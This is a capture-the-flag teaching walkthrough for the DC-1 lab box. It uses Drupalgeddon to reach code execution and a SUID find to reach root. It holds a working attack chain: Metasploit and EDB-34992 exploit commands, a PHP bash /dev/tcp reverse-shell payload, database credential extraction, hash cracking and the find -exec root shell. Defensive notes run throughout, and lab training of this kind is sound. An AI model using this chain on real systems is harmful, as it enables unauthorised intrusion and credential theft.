# Part A — The method (theory)

## A.1 From "something is running" to "this version is known-broken"

On Machine 2 you turned a **kernel version** into an exploit; here the same chain on a **web application**: **fingerprint** the CMS (headers/HTML/paths) → pin the **exact version** → research what is broken **in that range** → exploit. Guessing the CMS from the visual design wastes an hour; headers answer in two seconds. One beginner miss, fixed on this box: headers (`X-Generator`) announce the CMS and its **major** version, never the patch level — the exact number usually sits in a `CHANGELOG.txt` in the web root. aldeid's `droopescan` only answered "7.22–7.26"; the changelog answered `Drupal 7.24, 2013-11-20`. A range is not enough to choose an exploit confidently — close the gap.

## A.2 What a CMS CVE is — and why "pre-auth" is so much worse

A **CMS** (Content Management System) is code shared by **thousands** of sites, so a bug
in the **framework** hits every site running that version — not just one target.

- **Pre-authentication:** exploited **before** you log in — you need no account at all.
- **Post-authentication:** you need an account first — a far smaller attack surface.

**Drupalgeddon** (**CVE-2014-3704**, advisory **SA-CORE-2014-005**) is a **pre-auth SQL
injection** in Drupal 7's database layer: Drupal built SQL `IN (...)` lists from **array
keys you send**, and before 7.32 its placeholder expansion was wrong — so a crafted array
key lets you **smuggle your own SQL into the query the login form already runs**. One
request, no account; attacker-controlled SQL escalates to **code execution**. The classic
proof-of-concept (EDB-34992) uses the hole simply to **insert a new administrator row** —
the general class (SQLi → data theft → code exec) is the subject of
[02 — Web Attacks](../02-Web-Attacks.md).

> **Two "Drupalgeddon"s.** Drupal 7.24 is vulnerable **both** to CVE-2014-3704 (D1:
> 7.0–7.31) **and** to CVE-2018-7600 (D2: < 7.58, "Forms API property injection", advisory
> SA-CORE-2018-002). Both work here — writeups use each. Choose by **version range**, never
> by which number is higher.

## A.3 Metasploit: exploit vs payload, Meterpreter vs shell

**Metasploit** is a framework of pre-written exploits, payloads and auxiliary modules; it
automates the *mechanics* (request, listener, session), not your understanding.

- **Exploit (module):** the code that **breaches** the vulnerability (e.g. `drupal_drupageddon`).
- **Payload:** what **runs after** the breach (e.g. a reverse shell that calls home).

| | **Meterpreter** | **Plain shell** |
| --- | --- | --- |
| Is | a scripting environment **inside** the exploit | a real OS shell |
| Gives | `getuid`, `download`, `hashdump`, … | `cat`, `grep`, `mysql`, editors |
| Loses | the OS tools | the Meterpreter tools |

**`meterpreter > shell`** drops to a real shell; make it interactive with
`python -c 'import pty; pty.spawn("/bin/bash")'` (**`python`, not `python3`** — this box,
Step 3's trap). Options: `RHOSTS` = **target**, `RPORT` = target port (`80`),
`TARGETURI` = CMS subdirectory path (`/` here), **`LHOST` = your IP on the lab interface**
(`ip -br a`; `127.0.0.1` = no session ever), `LPORT` = your listener (default `4444`).
Marks: `[*]` information, `[+]` success, `[-]` failure.

## A.4 The config file: a secret store you cannot protect

A CMS **must** authenticate to its database on **every** request, so the DB password must
be recoverable by the server — not a one-way hash (MySQL needs the real password), not
encrypted with a key on the same machine. Therefore **anyone who controls the web user
reads the DB password.** Design assuming that — this box writes it into flag 1: *"Every
good CMS needs a config file — and so do you."*

## A.5 SUID, in depth

**SUID** (*set-user-ID*) makes a program run with the privileges of the **file's owner**, not the caller's — for good reason: `/usr/bin/passwd` is SUID-root so an ordinary user can change **their own** password (which requires writing `/etc/shadow`).

**When a *powerful* binary carries SUID, that power becomes yours.** `find` has `-exec`, which runs **any** command — a SUID `find` is a root shell in disguise; `passwd` cannot run arbitrary programs, so its SUID is safe. Rule of thumb: SUID on a *single-purpose* binary is design; on a *general-purpose* one (`find`, `vim`, `python`, `nmap`, `cp`) it is a vulnerability.

**`uid` vs `euid`.** Under SUID your **real** UID stays yours while the **effective** UID becomes the owner's — and the kernel consults the **euid** on file access. So `whoami` can print `www-data` while you read `/root/thefinalflag.txt`. The author says the same on VulnHub: *"You don't even need to be root to do this, however, you will require root privileges"* — keep the `www-data` identity, borrow root's authority.

## A.6 Password hashes: crack them, or replace them?

Drupal stores passwords as a `$S$`-prefixed **PHPass**-style hash. Two sourced facts set
the strategy here:

- **Slow by design.** The EDB-34992 source computes `$S$` with **SHA-512**; John reports
  for DC-1: `Drupal7, $S$ [SHA512]`, `Cost 1 (iteration count) is 32768`,
  `2 password hashes with 2 different salts` — 32,768 rounds over a per-user random salt.
- **Slow ≠ safe.** aldeid's rockyou run cracked both at **~350 guesses/s after ~1 h 46 min**
  (`admin` → `53cr3t`, `Fred` → `MyPassword`).

So: **crack** (offline guessing — hours, only if the password is in your wordlist) or **replace** (write a fresh, valid hash into `users` — seconds, works *whatever* the old password was). Replace whenever you may write to the credential store; crack only when you cannot — e.g. a hash from a system you do not control.

# Part C — The walkthrough, step by step

> Notation: `TARGET` = the DC-1 IP, `SRV` = your attacker/serve IP (use the VPN IP shown by
> `ifconfig`/`ip a`, not `127.0.0.1`). Read every command *before* you run it; the
> explanations are the lesson.

## Step 1 — Fingerprint: what is listening, and what does it advertise?

```bash
nmap -sV -sC -p- -oA dc1-full TARGET
curl -s http://TARGET/CHANGELOG.txt | head -5
```

* `nmap … -p-` scans **all 65535 TCP ports**, not just the top 1000 — an unusual port is
  exactly what you miss otherwise; `-sC` runs default scripts, `-sV` guesses service
  versions, `-oA dc1-full` saves output in three formats for your notes.
* `curl -s http://TARGET/CHANGELOG.txt` fetches a file Drupal ships by default;
  `| head -5` shows only the first lines — and it answers exactly:
  `Drupal 7.24, 2013-11-20` — a version and a date.
* Why the date matters: the box was released in 2019 but the site claims software from
  2013. Six years of unpatched CVEs sit behind that date. The lesson: **outdated software
  is not a theoretical risk; it is the most common root cause on vulnerable targets.**
* Some writeups also see a high `status (RPC #100024)` port open; whether it appears
  depends on your build/NAT. If it is absent on your instance, that is normal.

Defensive note: block direct access to `CHANGELOG.txt`, `README.md`, `.git` and similar
files at the web-server layer (or never deploy them), and strip version strings from
`X-Generator`/`X-Powered-By`. That hides nothing fundamental, but it raises the cost of the
cheapest reconnaissance.

## Step 2 — Turn the version into an exploit search

```bash
searchsploit drupal
searchsploit drupal 7
searchsploit -x 34992
msfconsole -q -x "search drupal; exit"
```

* `searchsploit drupal` lists every Drupal entry in the local Exploit-DB copy; adding `7`
  (what aldeid and ziomsec both ran) narrows it to your fingerprinted branch.
* `searchsploit -x 34992` prints the exploit's source so you can *read the vulnerability*
  before running anything. EDB-34992's real title is **"Drupal 7.0 < 7.31 - 'Drupalgeddon'
  SQL Injection (Add Admin User)"** (CVE-2014-3704, Claudio Viviani, 2014-10-17).
* `msfconsole -q -x "search drupal; exit"` queries Metasploit's module index from the
  shell instead of waiting inside the console — you are looking for
  `exploit/multi/http/drupal_drupageddon` (CVE-2014-3704).
* The trap: a version number without a *search* is trivia. The skill is
  `version → searchsploit/Metasploit → read the source → decide`.

**What the bug is (theory before you fire):** Drupal 7's `expandArguments()` appended
**array keys you send** into SQL `IN (...)` lists *without sanitising them*, so a crafted
key in the ordinary **login-form POST** (`form_id=user_login_block`) smuggles arbitrary SQL
into the query Drupal already runs — the EDB PoC `insert`s a new administrator row into
`users` and grants it the admin role (`rid = 3`). One request, no account, no password:
why one unsanitised parameter earned CVSS 9.4 (CVE-2014-3704, disclosed Oct 2014, patched
in 7.32).

Defensive lesson: the fix was sanitising one parameter's keys. The *systemic* lesson is
that patch level **is** your posture — 7.32 was a drop-in upgrade that closed a
one-request admin takeover.

## Step 3 — Route A: exploit it with Metasploit

```bash
msfconsole -q
use exploit/multi/http/drupal_drupageddon
set RHOSTS TARGET
set LHOST <your VPN/attacker IP>
set PAYLOAD php/meterpreter/reverse_tcp
run
```

* `use exploit/multi/http/drupal_drupageddon` selects the Drupalgeddon module —
  "Drupal HTTP Parameter Key/Value SQL Injection", RCE: the same CVE-2014-3704 bug as
  EDB-34992, weaponised to run code instead of only inserting a user.
* `set RHOSTS TARGET` is the target; `set LHOST <VPN IP>` is where *your* listener lives —
  `127.0.0.1` here is the #1 beginner failure: the shell connects back to itself.
* `set PAYLOAD php/meterpreter/reverse_tcp` runs a PHP reverse shell — right for a **web**
  exploit: no compiled dropper needed on a box with no compiler.
* `run` sends the crafted request. On success: `session 1 opened` and `meterpreter >`.
  Then `sysinfo`, `getuid` (`uid=33 www-data`), `shell` for a normal prompt.

Two traps:

1. **`python` vs `python3`.** DC-1 ships **Python 2 only** —
   `python -c 'import pty; pty.spawn("/bin/bash")'` works, `python3 …` does not (command
   not found). Some writeups fight a dead prompt for minutes before realising this; try
   `python` first, `python3` on other boxes.
2. **TTY.** If job-control messages appear, `background` (Meterpreter) and `sessions -i 1`
   later is the clean habit; if a `stty raw -echo` trick eats your prompt, `reset` restores
   it. Shell-stabilisation variants live in
   [06 — Shells, Persistence and Escapes](../06-Shells-Persistence-and-Escapes.md).

Honest footnote: some writeups report Metasploit timing out or the session dying on this
box (your build and IP range can matter). That is not "the exploit failed" — it means try
**Route B**, which is why it exists.

## Step 4 — Route B (manual): EDB-34992 + the PHP Filter module

**Why Route B exists:** it works when Metasploit's session is flaky (Step 3), and it shows
you the bug instead of hiding it behind a module. aldeid and Denham both pwned DC-1 this
way.

**B1 — create an admin user with the EDB script:**

```bash
searchsploit -m 34992          # -m mirrors 34992.py into your cwd (-x only views it)
python 34992.py -t http://TARGET -u myadmin -p mypassword
```

* `-t` is the target URL (the scheme is mandatory — the script exits without `http://`);
  `-u`/`-p` are the credentials **you choose**. The script fires the login-form SQLi from
  Step 2, `insert`s that user into `users` + `users_roles`, and prints
  `[!] Administrator user created!` — then you log in normally in the browser.
* `python`, **not** `python3` — Step 3's trap again (aldeid's run shows `/usr/bin/python`
  is what this box has).

**B2 — turn the admin session into code execution (the PHP Filter route):**

*Theory first:* Drupal ships a **PHP filter** text format — content marked "PHP code" is
*executed* by the server. It ships disabled; as admin you can switch it on. That is the
pattern to remember: **admin → privilege → code exec**, no CVE needed.

1. `Modules` → enable **PHP filters** → *Save configuration* → its *Permissions* link →
   grant the `administrator` role.
2. `Content → Add content → Basic page`, body =
   `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/SRV/4444 0>&1'"); ?>`, text format =
   **PHP code**, save.
3. On `SRV`: `rlwrap nc -nlvp 4444` (plain `nc -nvlp 4444` works too) → open **Preview**
   on the node → shell back. Prove it: `id` → `uid=33(www-data)`.

* **Alternative without the UI:** Metasploit's `exploit/unix/webapp/drupal_drupalgeddon2`
  (AKA SA-CORE-2018-002, "Forms API property injection" — Drupalgeddon **2**) also works
  on 7.24; ziomsec used exactly that module. Two different CVEs (D1 = login-form SQLi,
  D2 = render-array injection), one box — choose by **version range**, per A.2.
* Defensive lesson: Route A vs B is *your* choice — the defender only gets one: patch to
  7.32+ **and** 7.58+ (or the final 7.x), and never enable PHP-filter-style code execution
  for content authors. Legacy installs that cannot upgrade must be network-isolated; a WAF
  rule is a delay, not a fix.

## Step 5 — flag1 and the config file: where passwords live

```bash
find /var/www -name 'flag*' 2>/dev/null
cat /var/www/flag1.txt
grep -A6 databases sites/default/settings.php
```

* `find /var/www -name 'flag*'` — the first flag is in the web root; flag1 reads: *"Every
  good CMS needs a config file — and so do you."* **Read flags as instructions**: this one
  says "the next prize is in the config file".
* `grep -A6 databases sites/default/settings.php` — `settings.php` is Drupal's config;
  `-A6` prints the 6 lines after the `$databases` array opens: `'database' => 'drupaldb'`,
  `'username' => 'dbuser'`, `'password' => 'R0ck3t'`.
* **flag2 hides in the same file** — a comment block at the top of `settings.php` reads:
  *"Brute force and dictionary attacks aren't the only ways to gain access (and you WILL
  need access). What can you do with these credentials?"* — i.e. **log in with what you
  just found**, don't brute force. Two flags, one `cat`.
* **Theory — why this file always leaks after code exec:** a CMS must reach its DB on
  *every* request, so the password must be *recoverable by the server* — not hashed, not
  encrypted with a key it also holds (A.4). Once you are `www-data`, config-file secrets are
  read, not cracked. Defensive note: `settings.php` must be unreadable to other local
  users *by design* (tight perms, no world-readable copy, no backups in the web root) —
  but assume the DB password is compromised the moment code execution exists; rotate it.

Trap: beginners `cat` flag1 and move on. The **format** matters: flags here are a
message-passing system (`flag1` → config → `flag2` → hash → …). Follow the chain.

## Step 6 — The users table, hashes, and the crack-vs-replace fork

```bash
mysql -u dbuser -pR0ck3t -D drupaldb -e 'SELECT uid,name,pass FROM users;'
```

* `mysql -u <user> -p<pass> -D <db> -e '<query>'` — credentials straight from Step 5
  (`dbuser` / `R0ck3t` / `drupaldb`); `-e` runs one query and exits (no prompt).
  `-p` and the password must have **no space** between them.
* The `users` table gives `uid 1 admin` and `uid 2 Fred` with their `pass` column:
  `admin → $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR`,
  `Fred → $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg` (values from the
  writeups/lab; your build may differ).
* ⚠️ **Verification note:** a widely-copied screenshot shows the password literally as
  `password` — that is a **placeholder**, not the real Drupal hash, and not what you will
  see in the DB.
* ⚠️ **Verification note:** the account is **`Fred`** — capital F. `fred`, `FRED` fail in
  the UI and in `SELECT … WHERE name='fred'`.

**Fork — crack or replace (A.6 decides):**

```bash
# Option A — crack (you will need the wordlist anyway)
echo '$S$DvQ...' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   # admin → 53cr3t
# Fred's hash → MyPassword (aldeid: ~350/s, ~1 h 46 min)

# Option B — replace (no cracking needed)
php scripts/password-hash.sh 'YourNewPass123'
# UPDATE users SET pass='<new $S$ hash>' WHERE name='admin';
```

* **Option A:** `john --wordlist=…` guesses offline. `$S$` = phpass **SHA-512**, **32768
  rounds**, per-user salt (A.6) — slow, but rockyou still beats it here: `admin → 53cr3t`,
  `Fred → MyPassword`.
* **Option B:** Drupal ships `scripts/password-hash.sh` — run it *on the box* (it needs
  Drupal's own hashing code) to print a valid `$S$` hash for any plaintext, then `UPDATE`
  the `users` row. Seconds, any old password.
* **Trap (escaping):** in `mysql -e` or a PHP double-quoted string the `$S$…` must be
  escaped (`\$S\$`) or the shell/PHP eats it as a variable → "invalid hash" errors. Single
  quotes in bash; `\$` inside PHP.
* **flag3 appears once you log in** (`admin:53cr3t`, or your replaced password): it is a
  leftover *Content* post in the Drupal dashboard, reading *"Special PERMS will help FIND
  the passwd - but you'll need to -exec that command to work out how to get what's in the
  shadow."* — puns intended: **perms** = permissions, **FIND** and **-exec** = the SUID
  `find` trick that Step 7 executes.

## Step 7 — www-data → root: the SUID reflex

```bash
find / -type f -user root -perm -u=s 2>/dev/null   # aldeid's form; -perm -4000 = same idea
find . -exec /bin/sh -p \; -quit                   # run any command with root's euid
id                                                 # → euid=0(root)
```

* `find / … -perm -u=s` lists **SUID** binaries (`-perm -4000` = the octal equivalent);
  `2>/dev/null` hides permission-denied noise. The money hit on DC-1: **`/usr/bin/find`**
  (plus the usual safe ones: `passwd`, `su`, `mount`, `ping`…).
* **Theory (A.5):** SUID runs a program with the **file owner's** privileges. `find` is
  *general-purpose* — its `-exec` runs **any command**, so `find . -exec /bin/sh -p \;`
  executes **as root**. `-quit` stops `find` after the first match; `id` proves it:
  `uid=33(www-data) … euid=0(root)`.
* Variants the writeups actually use: `find . -exec /bin/sh \; -quit` (lab, Denham —
  works because this `sh` keeps inherited euid), `find . -exec /bin/bash -p \; -quit`
  (aldeid), `find local.txt -exec /bin/sh -p \; -quit` (ziomsec, via GTFOBins). The
  pattern: **SUID binary + its "run this" feature**; `-p` stops shells from dropping the
  effective uid.
* Trap: `whoami` may still print `www-data` (real uid unchanged) while `id` shows
  `euid=0` — **the kernel checks euid** (A.5). The author says the same on VulnHub:
  *"You don't even need to be root … you will require root privileges."*
* Why `find` and not `passwd`: SUID on a **single-purpose** binary is design; on a
  **general-purpose** one it is a root shell in disguise. `find`, `vim`, `python`, `nmap`,
  `cp` must never be SUID — the reflex audit is this exact `find` command, see
  [05-Linux-Privilege-Escalation.md](../05-Linux-Privilege-Escalation.md).

## Step 8 — flag4, and the final flag: reading the chain to the end

```bash
ls -la /home
cat /home/flag4/flag4.txt                 # flag4 — world-readable, no root needed
find /root -type f 2>/dev/null            # see what's up there (SUID find or root shell)
find /root -type f -name thefinalflag.txt -exec cat {} \;
```

* **flag4** lives with its own user account (`/home/flag4/flag4.txt`, mode `rw-r--r--`)
  and is the last *clue*, not the prize: *"Can you use this same method to find or access
  the flag in root? / Probably. But perhaps it's not that easy. Or maybe it is?"* — "this
  same method" = the permission/read approach you have been using all along.
* The **final flag** (`/root/thefinalflag.txt`), verbatim from aldeid's run:

  ```
  Well done!!!!

  Hopefully you've enjoyed this and learned some new skills.

  You can let me know what you thought of this little journey
  by contacting me via Twitter - @DCAU7
  ```

* ⚠️ **Verification note:** several writeups — and earlier revisions of this card — print
  *"It was a dark and stormy night…"* as the final flag; that text belongs to a
  **different** machine's walkthrough and is **not** DC-1's final flag. The text above is
  DC-1's (also matches the official lab README).
* **Five flags total** — flag1 (`/var/www/flag1.txt`), flag2 (`settings.php` comment),
  flag3 (dashboard post), flag4 (`/home/flag4/flag4.txt`), final (`/root/…`). Three are
  instructions; do not stop before the fifth.
* `-exec … {} \;` runs `cat` **once per match** (`{}` = the found path, `\;` = terminator
  — escape it so bash passes the literal `;`); `xargs -n1 cat` is the fallback when
  filenames are unknown. aldeid read the final flag **without** a root shell this way —
  if your build's `/root` is `700`, use the Step 7 shell first; try both.
* Defensive lesson: world-readable flags in `/home` and a readable `/root` are *permission*
  problems, not authentication problems — home dirs `700`, root's dir `700`, secrets out
  of reach of `www-data`, and never SUID a general-purpose tool.

|---|---|---|---|
| 1 | `CHANGELOG.txt` / version headers | Info disclosure | Block/strip version files & headers; asset inventory |
| 2 | Drupalgeddon (SA-CORE-2014-005) | Pre-auth SQLi → RCE | Patch ≥ 7.32 (box: ≥ 7.58 covers D2 too); WAF = delay only |
| 3 | Unpatched 2013 CMS on 2019 box | Patch management | Track CVEs per component; automate updates; fail scans on stale versions |
| 4 | `settings.php` DB password readable | Secret management | Restrict perms, rotate on any code exec, separate least-priv DB user |
| 5 | Hashes crackable (`53cr3t`, `MyPassword`) | Weak passwords | Long passphrases/managed secrets; slow hashes + salting (they bought time, not safety) |
| 6 | SUID `find` → root | Misconfiguration | Never SUID general-purpose binaries; audit with the Step 7 `find` |
| 7 | World-reachable web root flags | Least privilege | `www-data` confined (AppArmor/SELinux); `/root` `700`; no secrets under docroot |

# Part E — Review questions

1. In one sentence: what did Drupalgeddon let you do *before* logging in, and why is the plain login form part of the story?
2. Which exact file pinned `7.24` — and why was `droopescan`'s `7.22–7.26` range not enough?
3. You found `users.pass` hashes. What can you do **without** cracking them, and why does Option B (replace) make cracking optional?
4. Why could `whoami` say `www-data` while you read `/root/thefinalflag.txt`? Name the two UIDs.
5. `find /root -name '*flag*' -exec cat {} \;` — explain `{}` and the escaped `\;`.
6. Rank your own root causes on this box: version, secret storage, password, permissions — which single fix removes the most attack paths? (You already tabled it in D.1.)

# Part F — Hints ladder (only open the rung you need)

<details>
<summary><b>Rung 1 — I can't even find the web app</b></summary>

`nmap -p- TARGET` first — but a browser/`curl http://TARGET/` on port 80 will do; the Drupal generator meta-tag in the HTML is the first hint.
</details>

<details>
<summary><b>Rung 2 — I have a shell but no idea what to do next</b></summary>

`find /var/www -name 'flag*'` and `cat` them **in order**. flag1 names the next file (a config file), and `grep -A6 databases sites/default/settings.php` gives DB credentials (flag2 is a comment in the same file).
</details>

<details>
<summary><b>Rung 3 — Metasploit won't give me a session</b></summary>

Check `LHOST` (VPN IP, not `127.0.0.1`), then switch to **Route B** (Step 4): EDB-34992 via `python`, or the `drupal_drupalgeddon2` module. Always confirm with `id` → `uid=33`.
</details>

<details>
<summary><b>Rung 4 — mysql/john/hash update problems</b></summary>

DB name and user are in `settings.php`; password goes straight after `-p` with **no space** (`-pR0ck3t`). In PHP/mysql, escape the hash: `\$S\$…`. If john is slow: expected — 32768 rounds; try Option B instead (`scripts/password-hash.sh` on the box).
</details>

<details>
<summary><b>Rung 5 — I'm www-data and stuck</b></summary>

SUID reflex: `find / -perm -4000 -type f 2>/dev/null`. SUID `find` found? → `find . -exec sh -p \;` (or `-exec /bin/sh -p \;`), then `ls -la /root/`. `id` must show `euid=0`.
</details>

## Community notes — consensus, pitfalls and alternative routes

- ⚠️ **Verification note — final flag:** writeups differ; some print *"It was a dark and stormy night…"* — that is **not** DC-1's final flag (it belongs to another machine's writeup). DC-1's real final flag is *"Well done!!!! / Hopefully you've enjoyed this…"* ending `Twitter - @DCAU7` (confirmed in the official lab README + multiple writeups).
- ⚠️ **Verification note — placeholder hash:** the `password` value seen in some screenshots is a **placeholder**, not the real `$S$` hash in `users.pass`.
- ⚠️ **Verification note — account name:** it is `Fred` (capital F) — `fred`/`FRED` fail.
- ⚠️ **Verification note — EDB titles:** EDB-34992's real title is *"Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)"* (`34992.py`, CVE-2014-3704). The Drupalgeddon**2** entries (EDB 44448/44449, CVE-2018-7600) are a **different** bug — older notes conflate them.
- ⚠️ **Verification note — rebuilds:** Denham and ziomsec cover the **OffSec Proving Grounds / rebuild** of DC-1 with **2 flags**; VulnHub's original has **5**. Flag counts and file paths in those writeups may not match this card.
- ⚠️ **Verification note — stray port:** a high `status (RPC #100024)` port in some scans is build/NAT-dependent noise; absent on your box ≠ wrong.
- Consensus pitfalls: Metasploit session flakiness (→ Route B), `python3` missing, `LHOST` set to `127.0.0.1`, unescaped `\$` in hash updates, stopping at `flag4`.

# Part H — If you get completely stuck

1. **Route in:** `nmap -p- TARGET` → `curl -s http://TARGET/CHANGELOG.txt | head -5` → `searchsploit drupal 7`.
2. **Shell:** Metasploit `drupal_drupageddon` (Step 3) *or* EDB-34992/Drupalgeddon2 with `python` (Step 4). Prove it: `id` → `uid=33`.
3. **Chain:** `find /var/www -name 'flag*'` → `cat flag1` → `grep -A6 databases sites/default/settings.php` (flag2) → `mysql -u dbuser -pR0ck3t -D drupaldb -e 'SELECT uid,name,pass FROM users;'` → crack `Fred` (`MyPassword`) or replace via `scripts/password-hash.sh` → log in → flag3.
4. **Root & end:** `find / -type f -user root -perm -u=s` → SUID `find` → `find . -exec /bin/sh -p \; -quit` → `id` (`euid=0`) → `cat /home/flag4/flag4.txt` → `find /root -type f -name thefinalflag.txt -exec cat {} \;`.

If every rung fails: re-read **flag texts in order** — they *are* the intended route.
